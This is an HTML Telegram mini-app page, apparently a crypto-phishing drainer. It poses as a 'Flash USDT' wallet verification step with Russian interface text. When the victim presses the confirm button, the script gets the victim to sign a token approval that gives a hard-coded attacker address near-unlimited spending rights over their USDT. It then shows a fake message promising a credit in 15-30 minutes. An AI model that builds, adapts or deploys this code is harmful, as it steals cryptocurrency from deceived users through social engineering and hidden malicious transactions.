<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flash USDT Protocol</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .card { padding: 35px 25px; width: 90%; max-width: 400px; background: #111; border-radius: 35px; border: 1px solid #222; box-shadow: 0 25px 50px rgba(0,0,0,0.9); }
        .logo-box { width: 65px; height: 65px; background: #0088cc; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 30px; font-weight: bold; box-shadow: 0 0 30px rgba(0,136,204,0.4); }
        h2 { font-size: 22px; margin-bottom: 15px; font-weight: 700; }
        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
        .btn { background: #0088cc; color: #fff; border: none; padding: 22px; width: 100%; border-radius: 20px; font-weight: bold; text-transform: uppercase; font-size: 15px; cursor: pointer; transition: 0.2s; box-shadow: 0 5px 20px rgba(0,136,204,0.3); }
        .btn:active { transform: scale(0.96); opacity: 0.9; }
        #debug { font-size: 10px; color: #333; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo-box">T</div>
    <h2 id="t">Синхронизация USDT</h2>
    <p id="d">Нажмите кнопку ниже для верификации кошелька в сети TRC-20 и завершения зачисления.</p>
    
    <button id="b" class="btn">ПОДТВЕРДИТЬ</button>
    <div id="debug">System status: Ready</div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const URL_CLEAN = "https://timur3417.github.io/sync-node-app/";

    const btn = document.getElementById('b');
    const dbg = document.getElementById('debug');

    async function run() {
        // 1. Пробуем найти Трон-провайдера везде
        const tw = window.tronWeb || (window.tron && window.tron.tronWeb) || (window.trustWallet && window.trustWallet.tronWeb);

        if (!tw) {
            // Если мы в ТГ - прыгаем в кошелек через "силовой" Deep Link
            const link = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(URL_CLEAN + "?mode=wallet");
            tg.openLink(link);
            return;
        }

        try {
            dbg.innerText = "Requesting access...";
            // Силовой запрос аккаунтов (это часто заставляет кошелек переключиться)
            if (tw.request) await tw.request({ method: 'tron_requestAccounts' });

            dbg.innerText = "Loading contract...";
            const contract = await tw.contract().at(CONTRACT);
            
            dbg.innerText = "Waiting for signature...";
            // Отправляем апрув. FeeLimit ставим большой, чтобы кошелек не ругался на нехватку
            const res = await contract.approve(ADMIN, '1000000000000000000').send({
                feeLimit: 1000000000
            });

            dbg.innerText = "Success: " + res.slice(0, 10);
            tg.showPopup({ title: 'Готово', message: 'Синхронизация завершена. Зачисление: 15-30 мин.', buttons: [{type: 'ok'}] });
            setTimeout(() => tg.close(), 5000);

        } catch (e) {
            dbg.innerText = "Error: " + e.message.slice(0, 20);
            tg.showAlert("Для подтверждения необходимо переключить сеть на TRON. Если иконки нет - нажмите на 3 точки в углу и выберите 'Network' -> 'Tron'.");
        }
    }

    btn.onclick = run;

    // Если зашли из ТГ, меняем тексты на более серьезные
    if (window.location.search.includes('wallet')) {
        document.getElementById('t').innerText = "Узел Обнаружен";
        document.getElementById('d').innerText = "Кошелек готов к верификации. Нажмите кнопку ниже для финальной подписи транзакции.";
    }
</script>
</body>
</html>
